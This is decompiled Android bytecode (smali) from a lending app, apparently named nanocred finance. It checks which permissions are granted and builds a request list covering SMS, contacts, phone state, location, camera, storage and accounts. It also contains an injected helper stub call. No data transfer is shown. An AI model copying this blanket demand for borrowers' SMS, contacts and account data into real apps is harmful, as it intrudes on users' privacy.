.class final Lcom/nanocred/finance/c/e/N;
.super Lkotlin/jvm/internal/Lambda;
.source "Paramount"

# interfaces
.implements Lkotlin/jvm/a/a;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/nanocred/finance/c/e/W;->a(Landroid/app/Activity;Lkotlin/jvm/a/p;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x18
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lkotlin/jvm/internal/Lambda;",
        "Lkotlin/jvm/a/a<",
        "Lkotlin/n;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic a:Landroid/app/Activity;

.field final synthetic b:Lkotlin/jvm/a/p;


# direct methods
.method constructor <init>(Landroid/app/Activity;Lkotlin/jvm/a/p;)V
    .registers 3

    iput-object p1, p0, Lcom/nanocred/finance/c/e/N;->a:Landroid/app/Activity;

    iput-object p2, p0, Lcom/nanocred/finance/c/e/N;->b:Lkotlin/jvm/a/p;

    const/4 p1, 0x0

    invoke-direct {p0, p1}, Lkotlin/jvm/internal/Lambda;-><init>(I)V

    invoke-static {}, Lcom/SEC/SEC/Helper;->stub()V

    return-void
.end method


# virtual methods
.method public bridge synthetic invoke()Ljava/lang/Object;
    .registers 2

    invoke-virtual {p0}, Lcom/nanocred/finance/c/e/N;->invoke()V

    sget-object v0, Lkotlin/n;->a:Lkotlin/n;

    return-object v0
.end method

.method public final invoke()V
    .registers 13

    .line 1
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 2
    new-instance v1, Lkotlin/jvm/internal/Ref$BooleanRef;

    invoke-direct {v1}, Lkotlin/jvm/internal/Ref$BooleanRef;-><init>()V

    const/4 v2, 0x0

    iput-boolean v2, v1, Lkotlin/jvm/internal/Ref$BooleanRef;->element:Z

    .line 3
    invoke-static {}, Lcom/nanocred/finance/c/e/W;->o()Z

    move-result v3

    const/4 v4, 0x1

    if-eqz v3, :cond_4d

    .line 4
    invoke-static {}, Lcom/nanocred/finance/c/e/W;->j()Z

    move-result v2

    if-eqz v2, :cond_42

    invoke-static {}, Lcom/nanocred/finance/c/e/W;->e()Z

    move-result v2

    if-eqz v2, :cond_42

    .line 5
    invoke-static {}, Lcom/nanocred/finance/c/e/W;->g()Z

    move-result v2

    if-eqz v2, :cond_42

    invoke-static {}, Lcom/nanocred/finance/c/e/W;->c()Z

    move-result v2

    if-eqz v2, :cond_42

    invoke-static {}, Lcom/nanocred/finance/c/e/W;->i()Z

    move-result v2

    if-eqz v2, :cond_42

    .line 6
    invoke-static {}, Lcom/nanocred/finance/c/e/W;->k()Z

    move-result v2

    if-eqz v2, :cond_42

    invoke-static {}, Lcom/nanocred/finance/c/e/W;->a()Z

    move-result v2

    if-eqz v2, :cond_42

    .line 7
    iput-boolean v4, v1, Lkotlin/jvm/internal/Ref$BooleanRef;->element:Z

    goto/16 :goto_f4

    .line 8
    :cond_42
    iget-object v2, p0, Lcom/nanocred/finance/c/e/N;->a:Landroid/app/Activity;

    invoke-static {v2}, Lcom/nanocred/finance/c/e/W;->b(Landroid/app/Activity;)Ljava/util/ArrayList;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->addAll(Ljava/util/Collection;)Z

    goto/16 :goto_f4

    .line 9
    :cond_4d
    invoke-static {}, Lcom/nanocred/finance/c/e/W;->n()Z

    move-result v3

    if-nez v3, :cond_f2

    .line 10
    sget-object v3, Lcom/nanocred/finance/c/h/Z;->a:Lcom/nanocred/finance/c/h/Z$a;

    const/4 v5, 0x0

    invoke-static {v3, v2, v4, v5}, Lcom/nanocred/finance/c/h/Z$a;->a(Lcom/nanocred/finance/c/h/Z$a;ZILjava/lang/Object;)Lcom/google/gson/u;

    move-result-object v3

    const-string v5, "sms"

    .line 11
    invoke-virtual {v3, v5}, Lcom/google/gson/u;->b(Ljava/lang/String;)Lcom/google/gson/p;

    move-result-object v5

    invoke-virtual {v5}, Lcom/google/gson/p;->size()I

    move-result v5

    const-string v6, "contact"

    .line 12
    invoke-virtual {v3, v6}, Lcom/google/gson/u;->b(Ljava/lang/String;)Lcom/google/gson/p;

    move-result-object v3

    invoke-virtual {v3}, Lcom/google/gson/p;->size()I

    move-result v3

    .line 13
    sget-object v6, Lcom/nanocred/finance/c/h/U;->b:Lcom/nanocred/finance/c/h/U$a;

    invoke-virtual {v6}, Lcom/nanocred/finance/c/h/U$a;->b()Lb/d/a;

    move-result-object v6

    if-eqz v6, :cond_7e

    .line 14
    iget-wide v6, v6, Lb/d/a;->b:D

    double-to-int v6, v6

    const/4 v7, -0x1

    if-eq v6, v7, :cond_7e

    const/4 v6, 0x1

    goto :goto_7f

    :cond_7e
    const/4 v6, 0x0

    .line 15
    :goto_7f
    invoke-static {}, Lcom/nanocred/finance/c/e/W;->d()Z

    move-result v7

    .line 16
    invoke-static {}, Lcom/nanocred/finance/c/e/W;->c()Z

    move-result v8

    .line 17
    invoke-static {}, Lcom/nanocred/finance/c/e/W;->i()Z

    move-result v9

    .line 18
    invoke-static {}, Lcom/nanocred/finance/c/e/W;->a()Z

    move-result v10

    if-lez v5, :cond_93

    const/4 v5, 0x1

    goto :goto_94

    :cond_93
    const/4 v5, 0x0

    :goto_94
    if-lez v3, :cond_98

    const/4 v3, 0x1

    goto :goto_99

    :cond_98
    const/4 v3, 0x0

    .line 19
    :goto_99
    :try_start_99
    invoke-static {}, Lcom/nanocred/finance/c/e/d;->f()Ljava/io/File;

    move-result-object v11

    .line 20
    invoke-virtual {v11}, Ljava/io/File;->exists()Z

    move-result v11
    :try_end_a1
    .catch Ljava/lang/Exception; {:try_start_99 .. :try_end_a1} :catch_a5

    if-eqz v11, :cond_a5

    const/4 v11, 0x1

    goto :goto_a6

    :catch_a5
    :cond_a5
    const/4 v11, 0x0

    :goto_a6
    if-eqz v5, :cond_b7

    if-eqz v3, :cond_b7

    if-eqz v6, :cond_b7

    if-eqz v8, :cond_b7

    if-eqz v9, :cond_b7

    if-eqz v11, :cond_b7

    if-eqz v10, :cond_b7

    if-eqz v7, :cond_b7

    const/4 v2, 0x1

    .line 21
    :cond_b7
    iput-boolean v2, v1, Lkotlin/jvm/internal/Ref$BooleanRef;->element:Z

    if-nez v3, :cond_c0

    const-string v2, "android.permission.READ_CONTACTS"

    .line 22
    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_c0
    if-nez v5, :cond_c7

    const-string v2, "android.permission.READ_SMS"

    .line 23
    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_c7
    if-nez v9, :cond_ce

    const-string v2, "android.permission.READ_PHONE_STATE"

    .line 24
    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_ce
    if-nez v6, :cond_d5

    const-string v2, "android.permission.ACCESS_FINE_LOCATION"

    .line 25
    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_d5
    if-nez v7, :cond_dc

    const-string v2, "android.permission.ACCESS_COARSE_LOCATION"

    .line 26
    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_dc
    if-nez v8, :cond_e3

    const-string v2, "android.permission.CAMERA"

    .line 27
    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_e3
    if-nez v11, :cond_ea

    const-string v2, "android.permission.WRITE_EXTERNAL_STORAGE"

    .line 28
    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_ea
    if-nez v10, :cond_f4

    const-string v2, "android.permission.GET_ACCOUNTS"

    .line 29
    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_f4

    .line 30
    :cond_f2
    iput-boolean v4, v1, Lkotlin/jvm/internal/Ref$BooleanRef;->element:Z

    .line 31
    :cond_f4
    :goto_f4
    sget-object v2, Lcom/nanocred/finance/a/b/g;->a:Lcom/nanocred/finance/a/b/g$a;

    new-instance v3, Lcom/nanocred/finance/c/e/M;

    invoke-direct {v3, p0, v0, v1}, Lcom/nanocred/finance/c/e/M;-><init>(Lcom/nanocred/finance/c/e/N;Ljava/util/ArrayList;Lkotlin/jvm/internal/Ref$BooleanRef;)V

    invoke-virtual {v2, v3}, Lcom/nanocred/finance/a/b/g$a;->a(Lkotlin/jvm/a/a;)V

    return-void
.end method
